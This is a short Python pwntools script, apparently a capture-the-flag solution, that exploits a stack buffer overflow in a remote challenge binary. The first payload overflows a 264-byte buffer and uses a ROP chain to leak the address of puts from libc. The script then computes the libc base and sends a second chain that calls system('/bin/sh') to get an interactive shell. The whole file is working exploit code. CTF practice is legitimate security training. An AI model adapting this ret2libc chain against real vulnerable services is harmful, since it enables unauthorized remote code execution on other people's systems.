#!/usr/bin/python3

from pwn import *

ADDR = "pwn.be.ax"
PORT = 5000
FILENAME = "./chall"

io = remote(ADDR, PORT)
binary = ELF(FILENAME)
libc = ELF("./libc.so.6")


ret_address = 0x40101a
pr_address = 0x401493


def craft_payload():
	payload = b"Techleas\x00"
	payload += b"A"*(264 - len(payload))
	#payload += p64(ret_address)
	payload += p64(pr_address)
	payload += p64(binary.got.puts)
	payload += p64(binary.sym.puts)
	payload += p64(binary.sym.main)
	return payload

def main():
	payload = craft_payload()
	io.sendlineafter(b"Please enter your name: ",payload)
	io.recvline()
	leaked_address = u64(io.recvline().strip().decode("latin-1").ljust(8, "\x00"))
	base_address = leaked_address - libc.sym.puts
	
	log.info("Base address: %s " % hex(base_address))
	log.info("Leaked address: %s "  % hex(leaked_address))
	
	binsh = base_address + next(libc.search(b"/bin/sh"))
	system = base_address + libc.sym.system
	
	payload = b"A"*264 + p64(pr_address) + p64(binsh) + p64(ret_address) + p64(system)
	io.sendlineafter(b"Please enter your name: ", payload)
	io.interactive()

if __name__ == "__main__":
	main()
